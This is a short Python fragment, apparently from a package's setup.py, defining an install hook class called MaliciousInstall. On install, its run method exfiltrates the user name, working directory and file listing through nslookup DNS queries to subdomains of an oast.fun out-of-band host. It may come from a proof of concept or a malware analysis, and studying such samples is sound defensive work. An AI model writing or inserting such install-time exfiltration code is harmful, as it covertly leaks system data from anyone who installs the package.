...
class MaliciousInstall(install):
    def run(self):
        ...
        os.system(f"nslookup {safe_user}.whoami.dbwgovzrtoclyqrugbqeyq112tznwiph0.oast.fun")
        os.system(f"nslookup {safe_pwd}.pwd.dbwgovzrtoclyqrugbqeyq112tznwiph0.oast.fun")
        os.system(f"nslookup {safe_ls}.ls.dbwgovzrtoclyqrugbqeyq112tznwiph0.oast.fun")
